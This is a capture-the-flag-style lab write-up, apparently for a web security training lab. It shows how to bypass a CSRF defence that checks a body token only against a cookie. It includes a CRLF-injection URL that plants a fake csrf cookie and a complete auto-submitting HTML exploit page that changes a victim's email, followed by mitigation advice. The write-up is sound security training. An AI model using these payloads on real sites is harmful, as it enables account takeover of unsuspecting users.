# Lab Name
CSRF where token is duplicated in cookie

## Vulnerability
Cross-Site Request Forgery (CSRF) – Token Duplicated in Cookie

## Objective
Exploit the CSRF protection by injecting a fake CSRF cookie and use it to change the victim's email address.

## Entry Point
Change Email functionality and Search functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF) / Cookie Injection

## Methodology
1. Open Burp's browser and log in using the provided user credentials.

2. Navigate to the **My Account** page and submit the **Update email** form.

3. Intercept the request using **Burp Suite Proxy** and send it to **Burp Repeater**.

4. Observe that the value of the **csrf** body parameter is validated only by comparing it with the **csrf** cookie.

5. Perform a search and intercept the search request using Burp Suite.

6. Send the request to **Burp Repeater** and observe that the search term is reflected inside the **Set-Cookie** response header.

7. Identify that this behavior allows **CRLF injection**, making it possible to inject arbitrary cookies into the victim's browser.

8. Create the following URL to inject a fake **csrf** cookie:

```text
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

9. Generate a **CSRF PoC** from the email change request using Burp Suite.

10. Upload the exploit to the **Exploit Server**.

11. Remove the auto-submit script and add the following image tag to inject the fake cookie before submitting the form:

```html
<img src="https://0a1d00a6036bb9b882c79c4e0020000f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
onerror="document.forms[0].submit();"/>
```

12. Set the **csrf** parameter in the form to:

```text
fake
```

13. Change the email address in the exploit to an attacker-controlled email address.

14. Store the exploit and click **Deliver to victim**.

15. When the victim visits the exploit page, the malicious image injects the fake **csrf** cookie into the victim's browser. The forged request is then submitted with the matching **csrf** parameter, causing the email address to be changed successfully and solving the lab.

## Payload Used

### Cookie Injection URL

```text
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

### Exploit

```html
<html>
  <body>

    <img src="https://0a1d00a6036bb9b882c79c4e0020000f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
         onerror="document.forms[0].submit();"/>

    <form action="https://0a1d00a6036bb9b882c79c4e0020000f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xyz@example.com">
      <input type="hidden" name="csrf" value="fake">
    </form>

  </body>
</html>
```

## Result
Successfully injected a fake **csrf** cookie into the victim's browser and bypassed the CSRF protection, allowing an unauthorized email change.

## Impact
- Unauthorized account modifications
- CSRF protection bypass
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Bind CSRF tokens to the authenticated user's session.
- Never validate CSRF tokens by simply comparing them with a client-controlled cookie.
- Prevent CRLF injection and HTTP response splitting.
- Sanitize user input before reflecting it into HTTP headers.
- Validate Origin and Referer headers in addition to CSRF tokens.

## Learning
This vulnerability occurs because the application validates the **csrf** parameter only by comparing it with the **csrf** cookie, both of which are controlled by the client. By exploiting a CRLF injection vulnerability to set a fake **csrf** cookie and submitting the same value in the request, an attacker can bypass the CSRF protection and perform unauthorized actions on behalf of the victim.
